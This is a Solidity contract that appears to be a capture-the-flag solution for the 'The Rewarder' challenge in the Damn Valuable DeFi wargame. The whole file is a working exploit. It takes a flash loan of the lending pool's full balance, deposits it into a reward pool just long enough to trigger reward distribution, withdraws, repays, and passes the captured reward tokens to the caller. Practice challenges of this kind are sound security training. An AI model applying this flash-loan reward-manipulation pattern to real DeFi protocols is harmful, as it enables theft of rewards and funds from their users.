pragma solidity ^0.8.0;

import '../the-rewarder/FlashLoanerPool.sol';
import '../the-rewarder/TheRewarderPool.sol';
import '../the-rewarder/RewardToken.sol';
import "../DamnValuableToken.sol";


contract TheRewarderAttack {

    FlashLoanerPool flPool;
    TheRewarderPool rPool;
    DamnValuableToken lToken;
    RewardToken rToken;

    constructor(address _flPool, address _rPool, 
                address _lToken, address _rToken) {
        flPool = FlashLoanerPool(_flPool);
        rPool = TheRewarderPool(_rPool);
        lToken = DamnValuableToken(_lToken);
        rToken = RewardToken(_rToken);
    }

    function attack() public {
        flPool.flashLoan(lToken.balanceOf(address(flPool)));        
        rToken.transfer(msg.sender, rToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) public {
        lToken.approve(address(rPool), amount);
        rPool.deposit(amount);
        rPool.distributeRewards();
        rPool.withdraw(amount);
        lToken.transfer(address(flPool), amount);
    }

}
